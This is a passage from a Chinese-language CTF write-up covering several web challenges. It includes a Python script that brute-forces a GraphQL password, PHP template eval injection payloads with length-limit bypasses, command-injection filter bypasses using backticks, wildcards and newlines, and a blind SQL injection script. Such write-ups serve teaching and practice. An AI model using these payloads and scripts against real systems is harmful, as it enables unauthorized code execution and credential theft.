            message = str(re.findall("'(.*)' not",r.text)[0])
            message_list = message.split("\u")[1:]
            if (message_list[count] == pass_list[count]) and (message_list[count + 1] == pass_list[count + 1]) and (message_list[count + 2] == pass_list[count + 2]):
                change_password = change_password + i
                end = 1
                break
            elif message_list[count] == pass_list[count]:
                possible_list.append(i)
        if end == 1:
            print change_password
            break
        #print possible_list
        count = count + 1
        poss1_list = []
        for j in possible_list:
            for z in s:
                payload = query % (change_password+j+z)
                s1 = requests.Session()
                r1 = s1.post(url, headers=headers, data=payload)
                sleep(0.1)
                message = str(re.findall("'(.*)' not", r1.text)[0])
                message_list = message.split("\u")[1:]
                if (message_list[count] == pass_list[count]) and (message_list[count + 1] == pass_list[count + 1]) and (message_list[count + 2] == pass_list[count + 2]):
                    end = 1
                    break
                elif message_list[count] == pass_list[count]:
                    poss1_list.append(z)
            if len(poss1_list) != 0:
                change_password = change_password + j
                if end == 1:
                    change_password = change_password + z
                find_password = find_password + "\u" + pass_list[count - 1]
                break
            if end == 1:
                break
        if end == 1:
            print change_password
            break
        #print poss1_list
        if len(poss1_list) == 1:
            print change_password
            continue
        else:
            count = count + 1
            for k in poss1_list:
                for m in s:
                    payload = query % (change_password + k + m)
                    s1 = requests.Session()
                    r2 = s1.post(url,headers=headers,data=payload)
                    sleep(0.1)
                    message = str(re.findall("'(.*)' not", r2.text)[0])
                    message_list = message.split("\u")[1:]
                    if (message_list[count] == pass_list[count]) and (message_list[count + 1] == pass_list[count + 1]):
                        change_password = change_password + k + m
                        find_password = find_password + "\u" + pass_list[count - 1] + "\u" + pass_list[count] + "\u" + pass_list[count + 1]
                        end = 1
                        break
                if end == 1:
                    break
            count = count + 2
            print change_password
            print find_password
11.跑出的密码是： **HappY4Gr4phQL**
检查一下是否正确：
12.查询结果为true，说明正确，但是，没有返回flag，这时候突然想到， **content**
字段中也有一串密文，按照上题来看，flag估计就是content字段的明文值了，于是继续爆破 **content** 字段密文
13.最后跑出flag
### 7.审计一下世界上最好的语言吧（1000 points）
考点：代码审计，命令执行
解题步骤：
1.下载www.zip，审计源码
2.漏洞触发点很明显，只有一个，在 **parse_template.php** 的 **parseIf** 函数中
分析发现，该函数对传入的参数 **$content** 进行`{if:(.*?)}(.*?){end
if}`规则的正则匹配，将匹配的结果的第一个元素，即`{if:(.*?)}的(.*?)`匹配字符串拼接到 **eval** 函数中 **执行命令**
3.接着找找哪里调用了 **parseIf** 函数
在 **parse_template.php** 的 **parse_again** 函数的末尾，调用了该函数，继续跟踪，就发现在
**index.php** 的最后，调用了 **parse_again** 函数
4.接下来，就是想办法让输入的参数符合条件，来执行 **parse_again** 函数，进而执行 **parseIf** 函数，触发漏洞
5.首先看下全局过滤： **common.php**
全局文件 **common.php** 对GET，POST，COOKIE中的参数进行了进行了 **check_var** 的检查，过滤了关键字：
**_GET，_POST，GLOBALS** ，然后，进行了 **变量覆盖** 的操作
6.所以执行 **parse_again** 函数的条件，就是 **content** 参数符合正则匹配：`(.*?)`
也就是说，我们随便传个参数`?content=123`就可以执行 **parse_again**
7.然后重点审计parse_again函数
该函数处理过程大致是：对传入的 **searchnum** ， **type** ， **typename** 和index.php中一开始传入的参数
**content** ，进行一个 **RemoveXSS** 的过滤，该函数过滤了大部分关键字：
其中就包括了 **parseIf** 函数中匹配的关键字： **if:**
过滤后，截取前20个字符，进行 **template.html** 模板文件的标签替换，最后触发 **parseIf** ，通过 **eval**
执行模板文件中符合`{if:(.*?)}(.*?){end if}`正则匹配的第一个结果字符串
如果我们输入的参数包含`{if:`，经过 **RemoveXSS** 处理后就变成了`{if`:，那么必然就不符合后面的匹配
所以，我们首先需要想办法来绕过 **RemoveXSS** 的过滤
我们可以发现，在 **RemoveXSS** 的过滤和执行 **parseIf** 的中间，还进行了4次的 **str_replace**
函数的替换，那么，我们就可以利用替换，来绕过过滤，比如我们传入：
    ?content={if:phpinfo()}{end if}
因为type参数为空，所以最后传入parseIf函数的内容就包括：
    {if:phpinfo()}{end if}
就能成功匹配了，但是，这里还有长度20的限制，所以，我们可以通过多次替换，来绕过限制
在模板文件中，存在一处可以让我们通过拼接来凑成`{if:(.*?)}(.*?){end if}`匹配结构的地方
8.传入payload：
    ?content=?content={i{haha:type}&searchnum={end%20if}&type=f:phpinfo()}
成功执行phpinfo，看看有没有disable_functions的限制
没有限制
8.接下来就是读 **flag.php** 文件，选用一个最短的 **readfile** 函数
    ?content=?content={i{haha:type}&searchnum={end%20if}&type=f:readfile('flag.php')}
但是，这样 **type** 参数长度还是超过了20，这时候，想到还有最后一个参数 **typename** 没有利用到，于是，传入：
    ?content={i{haha:type}&searchnum={end%20if}&type=f:rea{haha:typename}&typename=dfile(%27flag.php%27)}
### 8.bypass（800 points）
考点：rce，正则匹配特点，文件通配符，命令换行，命令注释
1.源码：
命令执行bypass，过滤点有两处
（1）正则匹配的黑名单：
    if (preg_match("/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $a))
            $a = "";
（2）对输入参数强制包裹双引号""：
    $a ='"' . $a . '"';
其实最致命的是第二处过滤，强制添加双引号，即使我们输入了黑名单里没有的命令，在双引号的作用下，也执行不了命令
所以，这时候就想到了，强制命令执行的 **反引号`**
2.但是，这里好像正则过滤了？其实没有，不信，我们测试一下：
很惊奇的发现，由于前面存在的：
    \\|
会将`|`进行转义，这是因为在 **preg_match**
中，三个反斜杠`\\\`才能匹配一个真正意义上的字符反斜杠`\`，所以这里因为正则的匹配机制造成了 **反引号逃逸**
3.执行命令：
    ?a=`uname`
果然成功执行 **uname** ，那么接下来，就是想办法列目录了，虽然这里 **ls** 被禁用了，但是我们还可以用 **dir**
    ?a=`dir /`
4.但是没有发现flag文件，试着找了其他常见目录下，也未发现，那么，就试着执行查找文件名操作： **find**
虽然 **find** 在黑名单中，但是，我们可以通过执行 **二进制文件** 和 **通配符**`?`的结合来进行绕过
payload：
    ?a=`/usr/b??/???d / -name ?lag`
但是还是未找到flag文件，再试着 **grep -R** 来搜索flag内容 **ctf** ，payload:
    ?a=`/?in/gre?%20-R%20ctf`
发现flag
5.不过这是非预期解，后面出题人把`\\`位置换到`\^`的前面，预期解是：
    ?a=\&b=%0a/???/gr?p%20-R%20ctf%20%23
实质上还是因为正则`\\`匹配不到`\`的问题，使用了换行`%0a`，再结合linux的 **命令终止符**`%20#`处理双引号，最终的命令为：
    file "\" "
    /???/gr?p -R ctf #"
### 9.easy_admin（1000 points）
考点：sql注入，HTTP头部修改
解题步骤：
1.打开靶机，是一个登陆界面
2.扫描目录，发现存在 **admin.php**
3.另外还有个 **forget.php**
思路就应该是要登陆admin，在 **forget.php** 中发现 **username** 存在注入点，用户名不存在时会返回no this
user，利用这个点进行布尔盲注
fuzz发现过滤了 **or** ， **and** ， **select** 等关键字，用 **& &**来代替 **and** 即可，盲注脚本如下：
    import requests
    url = "http://101.71.29.5:10045/index.php?file=forget"
    password = ""
    for i in range(1,50):
        for j in range(44,128):
            data= {
                "username":"admin' && ascii(substr(password,%d,1))=%d#"%(i,j)
            }
            r = requests.post(url,data=data)
            if "no this user" not in r.text:
                password = password + chr(j)
                print password
4.跑出admin的密码： **flag{never_too**
然后登陆admin
提示我们：admin will access the website from，于是加个头部字段：
    Referer:127.0.0.1
拿到另一半flag
最后的flag就是：flag{never_too_late_to_x}